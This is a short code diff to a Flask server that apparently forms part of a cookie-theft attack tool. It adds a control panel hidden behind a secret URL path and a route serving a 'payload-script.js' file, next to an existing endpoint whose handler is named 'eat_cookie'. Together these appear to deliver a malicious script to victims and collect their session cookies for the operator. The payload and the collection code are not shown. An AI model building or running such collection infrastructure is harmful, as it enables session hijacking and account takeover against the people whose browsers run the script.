@@ -24,7 +24,21 @@ requests_history = []
 MAX_HISTORY = 50
 
 def start_proxy(target, host, port, secret):
-    app = Flask(__name__)
+    app = Flask(__name__, static_folder='panel', static_url_path='')
+
+    # Serve panel files
+    @app.route(f'/{secret}')
+    def panel_index():
+        return send_from_directory('panel', 'index.html')
+
+    @app.route(f'/{secret}/<path:filename>')
+    def panel_files(filename):
+        return send_from_directory('panel', filename)
+
+    # Serve payload script
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('.', 'payload-script.js')
 
     @app.route('/ep/api/ping', methods=['POST'])
     def eat_cookie():
